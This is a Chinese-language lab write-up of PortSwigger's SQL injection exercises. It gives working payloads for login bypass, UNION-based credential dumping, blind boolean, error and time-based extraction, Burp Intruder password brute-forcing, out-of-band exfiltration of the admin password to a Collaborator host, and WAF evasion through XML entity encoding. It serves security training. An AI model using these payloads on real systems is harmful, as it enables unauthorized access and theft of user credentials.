## 目录

- [WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据](#WHERE子句中的SQL注入漏洞允许检索隐藏数据)
- [允许绕过登录的 SQL 注入漏洞](#允许绕过登录的SQL注入漏洞)
- [联合查询 Oracle 上的数据库类型和版本](#联合查询Oracle上的数据库类型和版本)
- [联合查询 MySQL 和 Microsoft 上的数据库类型和版本](#联合查询MySQL和Microsoft上的数据库类型和版本)
- [列出非 Oracle 数据库上的数据库内容](#列出非Oracle数据库上的数据库内容)
- [列出 Oracle 上的数据库内容](#列出Oracle上的数据库内容)
- [SQL 注入 UNION 攻击，确定查询返回的列数](#SQL注入UNION攻击-确定查询返回的列数)
- [SQL 注入 UNION 攻击，查找包含文本的列](#SQL注入UNION攻击-查找包含文本的列)
- [SQL 注入 UNION 攻击，从其他表中检索数据](#SQL注入UNION攻击-从其他表中检索数据)
- [SQL 注入 UNION 攻击，检索单个列中的多个值](#SQL注入UNION攻击-检索单个列中的多个值)
- [使用条件响应进行盲目 SQL 注入](#使用条件响应进行盲目SQL注入)
- [使用条件错误进行盲目SQL注入](#使用条件错误进行盲目SQL注入)
- [可见的基于错误的SQL注入](#可见的基于错误的SQL注入)
- [时延SQL盲注](#时延SQL盲注)
- [基于延时的SQL盲注并且检索数据](#基于延时的SQL盲注并且检索数据)
- [带外交互的SQL盲注](#带外交互的SQL盲注)
- [通过带外交互获取数据实现SQL盲注](#通过带外交互获取数据实现SQL盲注)
- [通过XML编码使用过滤器旁路的SQL注入](#通过XML编码使用过滤器旁路的SQL注入)



## WHERE子句中的SQL注入漏洞允许检索隐藏数据

Food&Drink这个分类默认只能看到三个商品

![image-20240908200526042](./imgs/image-20240908200526042.png)

先判断是单引号还是双引号

![image-20240908195704536](./imgs/image-20240908195704536.png)

![image-20240908195721725](./imgs/image-20240908195721725.png)

```sql
' or 1=1 --
```

![image-20240908200615311](./imgs/image-20240908200615311.png)

显示所有商品

## 允许绕过登录的SQL注入漏洞

- 在`Username`中输入`any' or 1=1 -- `，密码随便写毕竟会被注释掉
  - 用`any'`来闭合参数，`or`一个为真即可通过，`-- `是 sql 的注释语法注释掉后面的密码
- 在`Username`中输入`administrator'-- `，密码随便写毕竟会被注释掉

1. 修改参数，为其指定值：`username``administrator'--`

![image-20240909135102396](./imgs/image-20240909135102396.png)

![image-20240909135749060](./imgs/image-20240909135749060.png)

![image-20240909135807196](./imgs/image-20240909135807196.png)

## 联合查询Oracle上的数据库类型和版本

![image-20240909140227480](./imgs/image-20240909140227480.png)

- URL 中输入`' order by 1--`，`order by 2--`，``

  - 网站正常显示

  ![image-20240909140904599](./imgs/image-20240909140904599.png)

  - 直到输入了“ `' order by 3--`”，服务器抛出了一个错误，这表明试图排序的列不存在，也就是说只有 2 列

  ![image-20240909140940950](./imgs/image-20240909140940950.png)
  
  
  
  用以下查询得到Oracle数据库版本信息：
  
  `'union select BANNER,NULL from v$version--`
  
  其中，banner是 Oracle 数据库中的一个元数据列，它包含了数据库的版本信息和其他相关信息。在 Oracle 数据库中，可以通过查询 `v$version` 视图来获取 `BANNER` 列的值。 可以看到查询结果回显了数据库版本信息：

![image-20240909200713611](./imgs/image-20240909200713611.png)

## 联合查询MySQL和Microsoft上的数据库类型和版本

过`'order by 2-- `正确回显，而`order by 3-- `无法回显，判断有两列。

![image-20240909201309554](./imgs/image-20240909201309554.png)

![image-20240909201254229](./imgs/image-20240909201254229.png)

然后判断回显位置： `' and 1=2 union select 1,2 -- `

![image-20240909201538931](./imgs/image-20240909201538931.png)

获取数据库版本：`' and 1=2 union select @@version,2 -- `

![image-20240909201703439](./imgs/image-20240909201703439.png)

PostgreSQL 查询数据库应为`' union select version(),null-- '`，查询结果为 200，说明数据库是PostgreSQL

![image-20240909202219263](./imgs/image-20240909202219263.png)

## 列出非Oracle数据库上的数据库内容

该应用程序具有登录功能，数据库包含一个保存用户名和密码的表。您需要确定此表的名称及其包含的列，然后检索表的内容以获取所有用户的用户名和密码。



先判断列数 `'order by 3--`的时候报错，说明有两列



`'UNION SELECT table_name,NULL FROM information_schema.tables-- `

![image-20240909204011446](./imgs/image-20240909204011446.png)

`'UNION SELECT column_name,NULL FROM information_schema.columns where table_name='users_muxymp'--`

![image-20240909204402227](./imgs/image-20240909204402227.png)

![image-20240909204419505](./imgs/image-20240909204419505.png)

得到两个有用的列名：

- username_axhfjx
- password_ijuudt

`'UNION SELECT username_axhfjx,password_ijuudt from users_muxymp -- `

![image-20240909204826820](./imgs/image-20240909204826820.png)

然后拿着administrator的账密去登录，登录成功~~~~

## 列出Oracle上的数据库内容

和上一关类似，只是现在需要列出Oracle数据库的内容。

`'union select 'a','a' from dual--`

dual是Oracle数据库中的一个虚拟表（或称伪表），它只有一行一列，用于执行没有真实表可用的 `SELECT`语句或计算表达式。 可以判断查询返回了包含文本的两列。

![image-20240909205422136](./imgs/image-20240909205422136.png)

三列的时候报错

![image-20240909205409981](./imgs/image-20240909205409981.png)

[SQL injection cheat sheet---通过搜索 all_tables Oracle 找到表的字段名是`TABLE_NAME`](https://portswigger.net/web-security/sql-injection/cheat-sheet)

`'UNION SELECT table_name,NULL FROM all_tables--`

`all_tables` 视图是 Oracle 数据库中的一个系统视图，用于提供关于所有表、视图和同义词的信息，包括它们的名称、拥有者、表空间等信息。如下：



![image-20240909205545690](./imgs/image-20240909205545690.png)

找到存放用户信息的表：USERS_WKXSXT



列出表中字段名，得到我们所需字段名：

`'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_WKXSXT'--`

![image-20240909210806657](./imgs/image-20240909210806657.png)

![image-20240909210823548](./imgs/image-20240909210823548.png)

然后获取数据

`'union select USERNAME_HASNYJ,PASSWORD_QFQDYY from USERS_WKXSXT--`

![image-20240909211214664](./imgs/image-20240909211214664.png)

用管理员账户进行登录成功！

## SQL注入UNION攻击-确定查询返回的列数

直接用`order by`查出列数为3

![image-20240909211659497](./imgs/image-20240909211659497.png)

![image-20240909211645262](./imgs/image-20240909211645262.png)

然后用UNION进行SQL空值攻击就过关啦。 `'union select null,null,null--`

![image-20240909211818715](./imgs/image-20240909211818715.png)

## SQL注入UNION攻击-查找包含文本的列

1. 确定[查询返回的列数](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)。在参数中使用以下有效负载验证查询是否返回三列：`category`

   ```
   '+UNION+SELECT+NULL,NULL,NULL--
   ```

2. 尝试将每个 null 替换为实验室提供的随机值，例如：

   ```
   '+UNION+SELECT+'iPSXTH',NULL,NULL--
   ```

3. 如果发生错误，请转到下一个 null 并尝试该操作。

![image-20240909212411166](./imgs/image-20240909212411166.png)

## SQL注入UNION攻击-从其他表中检索数据

还是先通过`order by`得到列数为2。因为题目给了表名为`users`,列名也分别给出，所以直接union查询

![image-20240909212809976](./imgs/image-20240909212809976.png)

administrator</th>
                            <td>p3eo71j72d2j4fk4nf19

## SQL注入UNION攻击-检索单个列中的多个值

有两列

`' order by 2--`

![image-20240909213826267](./imgs/image-20240909213826267.png)

![image-20240909213815304](./imgs/image-20240909213815304.png)



只有第二字段是字符串类型，这意味着第一列总是需要用空值来占位。这里有两种方法可以解决。

![image-20240909214056448](./imgs/image-20240909214056448.png)

第一种是通过SQL语法，查询用户名为administrator的用户对应的密码：

```
'UNION SELECT null,password from users where username ='administrator'--
```

但是这种方式默认管理员用户名已知，局限性太大。所以推荐第二种方式进行注入

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

上面语句将两个 SELECT 查询的结果合并在一起，以便从不同的表中选择不同的列并将它们组合起来。在这个例子中，第一个 SELECT 语句选择了 NULL 常量值作为占位符，第二个 SELECT 语句选择了 username 和 password 列，并使用 '||' 运算符将它们连接起来，并在它们之间添加了一个自定义的分隔符 '~'。

![image-20240909214232858](./imgs/image-20240909214232858.png)

administrator~vm4mrp1xhneww7ilbphc

## 使用条件响应进行盲目SQL注入

此实验室包含一个[盲目 SQL 注入](https://portswigger.net/web-security/sql-injection/blind)漏洞。应用程序使用跟踪 Cookie 进行分析，并执行包含所提交 Cookie 值的 SQL 查询。

不会返回 SQL 查询的结果，并且不会显示任何错误消息。但是，如果查询返回任何行，则应用程序会在页面中包含 “Welcome back” 消息。

数据库包含一个名为 的不同表，其中的列名为 和 。您需要利用 SQL 盲注漏洞来找出用户的密码。`users``username``password``administrator`

要解决实验室问题，请以用户身份登录。`administrator`



而本关的关键在找到cookie里面有一个叫做`TrackingId`的参数。

![image-20240910111108532](./imgs/image-20240910111108532.png)

我们将`TrackingId`的内容后面添加上`' and '1'='1`，页面会返回"Welcome back"。

![image-20240910111314453](./imgs/image-20240910111314453.png)

当输入`' and '1'='2`时，不会返回"Welcome back"，确定该参数可以SQL盲注。

![image-20240910111349116](./imgs/image-20240910111349116.png)

接下来，在`TrackingId`后加上`' AND (SELECT 'a' FROM users LIMIT 1)='a`，如果为真，说明users表存在。而我们看到返回了"Welcome back"，说明存在表users。

![image-20240910111525427](./imgs/image-20240910111525427.png)

在`TrackingId`后加上`' AND (SELECT 'a' FROM users WHERE username='administrator')='a`，如果为真，说明存在用户名 administrator。而我们看到返回了"Welcome back"，说明存在用户名 administrator。

![image-20240910111846523](./imgs/image-20240910111846523.png)

在`TrackingId`后加上`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`，如果为真，说明密码长度大于1；可以手工改变`LENGTH(password)>2`后面整数值，也可以使用burp遍历，最终确定密码长度，实际上是20位。（大于19为真，大于20为假）

![image-20240910112042417](./imgs/image-20240910112042417.png)

确定密码长度后，就可以开始确定每个字符是什么，在`TrackingId`后加上`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`，判断密码的第一个字符，如果为真，说明是a，如果不为真，依次进行判断，可以用burp的intruder模板进行爆破。

在position模块默认攻击类型为狙击手sniper不变，来到payload有效载荷，默认类型为simple list不变。在payload settings添加测试字符，即在有效负载设置下添加从a到z和从0到9的有效负载。之后来到settings模块，因为当密码正确时可以在页面看到Welcome back，所以先清除所有Grep-Match中的值，添加Welcome back。完成以上配置后，start attack！

![image-20240910113240983](./imgs/image-20240910113240983.png)



![image-20240910113312901](./imgs/image-20240910113312901.png)

可以看到上面为攻击结果，当测试字符为h时，grep match字段值为1，说明我们第一位密码为g。类似地，我们可以这样测试后面的19位

爆破第二位：是j

![image-20240910113601740](./imgs/image-20240910113601740.png)

hj0o76ljs2m5ec8sal54

![image-20240910115501478](./imgs/image-20240910115501478.png)

## 使用条件错误进行盲目SQL注入

如果SQL查询导致错误，应用程序会返回一个自定义的错误消息。还是使用burosuite拦截请求，在cookie的trackingId后面加上`'`，可以看到服务端返回的状态码为500。而我们添加两个单引号`''`后，正常回显，那么该参数可能存在SQL盲注；

![image-20240910115827456](./imgs/image-20240910115827456.png)

因为返回的500错误是通用的错误，不能确定是SQL语法解析错误还是其他错误。为此构造SQL子查询，非Oracle数据库执行`'||(SELECT '')||'`，Oracle数据库执行`'||(SELECT '' FROM dual)||'`，如果没有报错，查询一个不存在的表`'||(SELECT '' FROM not-a-real-table)||'`，如果报错，则可以确定存在注入。可以看到我们加上from dual后服务端返回200，说明目标使用的是oracle数据库。

![image-20240910120008343](./imgs/image-20240910120008343.png)

当我们把dual换成任意一个不存在的表后，服务端返回500，确定存在盲注。- 接下来很关键，逻辑比较绕，在SQL语句中以from分隔前后，SQL语句执行顺序是先执行from后面的

![image-20240910120030327](./imgs/image-20240910120030327.png)

```
1. 真 from 真 ==>  真
2. 真 from 假 ==>  真
3. 假 from 真 ==>  假
4. 假 from 假 ==>  真
```

测试administrator用户是否存在，如果存在，from后面语句为真，因为to_char导致错误为假，返回500；如果不存在，from后面语句为假，查询结果为空，返回200。

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

可以看到，服务端返回500错误，说明from后面语句为真，即存在administrator用户；

![image-20240910120400270](./imgs/image-20240910120400270.png)![image-20240910120400328](./imgs/image-20240910120400328.png)

接下来确定密码长度，如果密码长度大于1，执行to_char(1/0)，返回错误，根据之前的方法确定密码长度20位：

`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![image-20240910120950488](./imgs/image-20240910120950488.png)

接下来通过intruder爆破20位密码，详细过程跟上一关一样，只需要和上一关一样上传payload settings，然后观察哪个字符值服务端返回500即可。

`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![image-20240910121209472](./imgs/image-20240910121209472.png)

6dcgcpef8apr56tov508

## 可见的基于错误的SQL注入

将单个引号附加到 Cookie 的值并发送请求，在响应中，请注意 verbose 错误消息。这将披露完整的 SQL 查询，包括 Cookie 的值。它还说明了您有一个未闭合的字符串文本。

![image-20240910122019067](./imgs/image-20240910122019067.png)

根据题意，我们知道目标存在users表，表中username和password字段存储用户名和密码。 通过TrackingId=abc`' AND 1=CAST((SELECT 1) AS int)--` 发送请求，服务器正常回显，表明这是一个有效的查询。调整该通用SELECT语句，以从数据库中检索用户名：

TrackingId=ogAZZfxtOKUELbuJ`' AND 1=CAST((SELECT username FROM users) AS int)--` 观察到收到初始错误消息。注意到由于字符限制，查询似乎被截断了。因此刚刚添加的注释字符没有被包含在内。删除TrackingId cookie的原始值以释放一些额外的字符。重新发送请求。

TrackingId=`' AND 1=CAST((SELECT username FROM users) AS int)--` ，收到一个新的错误消息，这似乎是由数据库生成的。这表明查询已经正确运行，但由于返回了多行，仍然会收到错误。 修改查询以仅返回一行：

TrackingId=`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` 发送请求。观察到错误消息现在泄漏了users表中的第一个用户名：

ERROR: invalid input syntax for type integer: "administrator" 现在我们知道管理员是表中的第一个用户，再次修改查询以泄漏他们的密码：

TrackingId=`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## 时延SQL盲注

根据题意，我们知道我们需要利用sql注入完成10秒的时延。因此，我们只需要利用bp抓包，在trackingid后面加上` '||pg_sleep(10)--`即可。

![image-20240910125057207](./imgs/image-20240910125057207.png)

## 基于延时的SQL盲注并且检索数据

抓包，还是修改TrackingId参数，TrackingId=x`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`。这里的`%3B`代表分号字符的URL编码版本，用于在SQL语句中分隔多个查询。如果不明白该sql查询的意思，可以单独将它拿出来看：

```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

该句使用了一个CASE语句来检查条件。如果条件 (1=1) 成立，则执行 pg_sleep(10)，即让数据库休眠 10 秒钟；否则执行 pg_sleep(0)，即让数据库休眠 0 秒钟。观察到存在延时，继续修改该语句；

修改：TrackingId=x`'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`，观察到返回没有延时，以此判断是boolean型注入；

判断用户名是否administrator，TrackingId=x`'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`，观察到延时，说明存在administrator用户名；

确定密码长度，实际是20位，TrackingId=x`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

确定密码字符，TrackingId=x`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

为了能够确定正确字符何时被提交，需要监控应用程序响应每个请求所花费的时间。为了使这个过程尽可能可靠，最好配置入侵者攻击以在单个线程中发出请求。转到resource pool“资源池”选项卡，并将攻击添加到一个最大并发请求设置为1的资源池中。

![image-20240910130249364](./imgs/image-20240910130249364.png)

依次爆破其余20位

## 带外交互的SQL盲注

这里我们需要让数据库对外部域执行 DNS 查找。先抓包，结合XXE攻击。为了找到正确的有效载荷，我们可以打开SQL注入备忘录，找到DNS lookup，上面有不同数据库对应的有效载荷如果一个个地试可以发现这里是oracle数据库。

![image-20240910130644812](./imgs/image-20240910130644812.png)

![image-20240910130633602](./imgs/image-20240910130633602.png)

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

其中EXTRACTVALUE（）是对XML文档进行查询和修改的函数。我们需要找到自己的COLLABORATOR子域名替换掉上面的`BURP-COLLABORATOR-SUBDOMAIN`。在burpsuite左上角的 collaborator c，注意这里只有bp professional可以打开。打开后点击copy to clipboard复制自己的collaborator子域名并进行替换。点击send，然后点击poll now，使用collaborator server检索DNS交互信息，我们可以发现接收地IP，说明DNS查询成功。

![image-20240910131017519](./imgs/image-20240910131017519.png)

![image-20240910131025542](./imgs/image-20240910131025542.png)

## 通过带外交互获取数据实现SQL盲注

根据题意，我们知道存在users表，存在username和password字段，并存在administrator用户名。在上一关的基础上进行修改，加上查询语句便可得到管理员密码。在trackingId后加上： `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

同样，替换掉你的子域名，send之后点击poll now查询，可以看到返回了密码。

![image-20240910131428404](./imgs/image-20240910131428404.png)

![image-20240910131459764](./imgs/image-20240910131459764.png)

## 通过XML编码使用过滤器旁路的SQL注入

根据题意，我们知道存在users表，并且提示我们存在网络应用防火墙WAF阻止我们SQL注入。别急，我们先来看看WAF的作用。进入实验，选择一个商品view details，点进去在最下面点击check stock，在burpsuite的proxy里的http history中，找到有一个post请求，它可能会直接与后端交互。将它send to repeator，点击send，这时我们可以尝试一下SQL注入。在productId的1后面加上`UNION SELECT NULL`进行测试，可以看到发送后响应里检测到了可能存在的攻击。因此，我们需要绕过WAF完成SQL注入。

![image-20240910131916614](./imgs/image-20240910131916614.png)

在注入 XML 时，请尝试使用 [XML 实体](https://portswigger.net/web-security/xxe/xml-entities)对有效负载进行模糊处理。一种方法是使用 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) 扩展。

![image-20240910132109389](./imgs/image-20240910132109389.png)

只需选中输入`1 UNION SELECT NULL`，右键单击，然后选择 **Hackvertor >extensions >encode > dec_entities **，可以看到生成了特殊编码来绕过WAF。

![image-20240910132323966](./imgs/image-20240910132323966.png)

如果我们写两个NULL，会得到下面这样的返回：

![image-20240910132353201](./imgs/image-20240910132353201.png)

所以可以知道，这里只能查询一列，我们需要将用户名密码用一句语句联合查询。

`UNION SELECT username || '~' || password FROM users`

![image-20240910132430774](./imgs/image-20240910132430774.png)

得到用户名和密码，找到管理员账户，成功登录！
